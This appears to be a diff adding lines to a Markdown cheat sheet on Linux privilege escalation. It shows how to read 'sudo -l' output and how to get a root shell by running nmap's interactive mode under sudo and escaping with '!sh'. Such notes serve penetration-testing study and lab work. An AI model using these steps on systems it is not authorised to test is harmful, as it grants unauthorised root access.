@@ -7,6 +7,14 @@ sudo su
 #### Check which commands sudo can run
 ``` 
 sudo -l
+
+# If you get something like 
+# User asterisk may run the following commands on this host:
+#    (root) NOPASSWD: /sbin/shutdown
+#    (root) NOPASSWD: /usr/bin/nmap
+# Google the application you can run as root, eg. nmap privilege escalation
+sudo nmap --interactive
+namp> !sh
 ``` 
 #### Check which version/year of Linux for privesc exploits
 ```
